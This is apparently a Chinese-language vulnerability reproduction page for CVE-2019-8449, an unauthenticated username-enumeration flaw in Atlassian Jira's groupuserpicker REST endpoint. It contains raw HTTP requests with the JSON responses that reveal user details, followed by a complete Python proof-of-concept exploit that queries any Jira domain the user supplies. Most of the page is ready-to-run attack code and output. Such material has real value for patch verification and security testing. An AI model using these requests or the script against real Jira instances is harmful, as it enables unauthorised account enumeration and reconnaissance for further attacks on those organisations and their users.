<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-8449）Atlassian Jira 信息泄露漏洞</h1><h2>一、漏洞简介</h2><p>Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。 Atlassian Jira 8.4.0之前版本中的/rest/api/latest/groupuserpicker资源存在信息泄露漏洞。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可利用漏洞获取受影响组件敏感信息。</p><h2>二、漏洞影响</h2><p>Atlassian Jira 7.12&lt; 受影响版本&lt;8.4.0</p><h2>三、复现过程</h2><p>某JIRA站点www.0-sec.org</p><p>我以目标是虚假的情况下，www.0-sec.org没有zerosec用户进行请求</p><p>GET /rest/api/latest/groupuserpicker?query=zerosec&amp;maxResults=50&amp;showAvatar=false HTTP/1.1<br />Host: www.0-sec.org<br />Pragma: no-cache<br />Cache-Control: no-cache<br />Upgrade-Insecure-Requests: 1<br />User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br />Accept-Encoding: gzip, deflate<br />Accept-Language: zh-CN,zh;q=0.9<br />Connection: close</p><p>该站点会返回一串json数据，说明找不到该用户</p><p>{"users":{"users":[],"total":0,"header":"显示 0 匹配的用户(共 0个)"},"groups":{"header":"显示 0 个匹配的组(共 0个)","total":0,"groups":[]}}</p><p>但是当我以一个已知用户身份测试时</p><p>GET /rest/api/latest/groupuserpicker?query=DesMond&amp;maxResults=50&amp;showAvatar=false HTTP/1.1<br />Host: www.0-sec.org<br />Pragma: no-cache<br />Cache-Control: no-cache<br />Upgrade-Insecure-Requests: 1<br />User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br />Accept-Encoding: gzip, deflate<br />Accept-Language: zh-CN,zh;q=0.9<br />Connection: close</p><p>会返回相应用户的一些信息</p><p>{"users":{"users":[{"name":"Desmond","key":"Desmond","html":"Desmond(Des)-test (&lt;strong&gt;Desmond&lt;/strong&gt;)","displayName":"Desmond(Des)-test"}],"total":1,"header":"显示 1 匹配的用户(共 1个)"},"groups":{"header":"显示 0 个匹配的组(共 0个)","total":0,"groups":[]}}</p><h3>poc</h3><p>CVE-2019-8449.py</p><p># Exploit Title: Jira 8.3.4 - Information Disclosure (Username Enumeration)<br /># Date: 2019-09-11<br /># Exploit Author: Mufeed VH<br /># Vendor Homepage: https://www.atlassian.com/<br /># Software Link: https://www.atlassian.com/software/jira<br /># Version: 8.3.4<br /># Tested on: Pop!_OS 19.10<br /># CVE : CVE-2019-8449<br /><br /># CVE-2019-8449 Exploit for Jira v2.1 - v8.3.4<br /># DETAILS :: https://www.cvedetails.com/cve/CVE-2019-8449/<br /># CONFIRM :: https://jira.atlassian.com/browse/JRASERVER-69796<br /><br />#!/usr/bin/env python<br /><br /><br />__author__  = "Mufeed VH (@mufeedvh)"<br /><br />import os<br />import requests<br /><br /><br />class CVE_2019_8449:<br />    def ask_for_domain(self):<br />        domain = raw_input("[&gt;] Enter the domain of Jira instance: =&gt; ")<br />        if domain == "":<br />            print("\n[-] ERROR: domain is required\n")<br />            self.ask_for_domain()<br />        self.url = "https://{}/rest/api/latest/groupuserpicker".format(domain)<br /><br />    def ask_for_query(self):<br />        self.query = raw_input("[&gt;] Enter search query: [required] (Example: admin) =&gt; ")<br />        if self.query == "":<br />            print("\n[-] ERROR: The query parameter is required\n")<br />            self.ask_for_query()    <br /><br />    def exploit(self):<br />        self.ask_for_domain()<br />        self.ask_for_query()<br /><br />        maxResults = raw_input("\n[&gt;] Enter the number of maximum results to fetch: (50) =&gt; ")<br />        showAvatar = raw_input(&quot;\n[&gt;] Enter 'true' or 'false' whether to show Avatar of the user or not: (false) =&gt; &quot;)<br />        fieldId = raw_input("\n[&gt;] Enter the fieldId to fetch: =&gt; ")<br />        projectId = raw_input("\n[&gt;] Enter the projectId to fetch: =&gt; ")<br />        issueTypeId = raw_input("\n[&gt;] Enter the issueTypeId to fetch: =&gt; ")<br />        avatarSize = raw_input("\n[&gt;] Enter the size of Avatar to fetch: (xsmall) =&gt; ")<br />        caseInsensitive = raw_input(&quot;\n[&gt;] Enter 'true' or 'false' whether to show results case insensitive or not: (false) =&gt; &quot;)<br />        excludeConnectAddons = raw_input("\n[&gt;] Indicates whether Connect app users and groups should be excluded from the search results. If an invalid value is provided, the default value is used: (false) =&gt; ")    <br /><br />        params = {<br />            'query': self.query, <br />            'maxResults': maxResults, <br />            'showAvatar': showAvatar, <br />            'fieldId': fieldId, <br />            'projectId': projectId, <br />            'issueTypeId': issueTypeId, <br />            'avatarSize': avatarSize, <br />            'caseInsensitive': caseInsensitive, <br />            'excludeConnectAddons': excludeConnectAddons<br />        }<br /><br />        send_it = requests.get(url = self.url, params = params)<br /><br />        try:<br />            response = send_it.json()<br />        except:<br />            print(&quot;\n[-] ERROR: Something went wrong, the request didn't respond with a JSON result.&quot;)<br />            print(&quot;[-] INFO: It is likely that the domain you've entered is wrong or this Jira instance is not exploitable.&quot;)<br />            print("[-] INFO: Try visting the target endpoint manually ({}) and confirm the endpoint is accessible.".format(self.url))<br />            quit()<br />        <br />        print("\n&lt;========== RESPONSE ==========&gt;\n")<br />        print(response)<br />        print("\n&lt;==============================&gt;\n")<br /><br />if __name__ == '__main__':<br />    os.system('cls' if os.name == 'nt' else 'clear')<br />    <br />    print('''<br />        ================================================<br />        |                                              |<br />        | CVE-2019-8449 Exploit for Jira v2.1 - v8.3.4 |<br />        |  Proof of Concept By: Mufeed VH [@mufeedvh]  |<br />        |                                              |<br />        ================================================<br />    ''')<br /><br />    CVE_2019_8449().exploit()</p></body></html>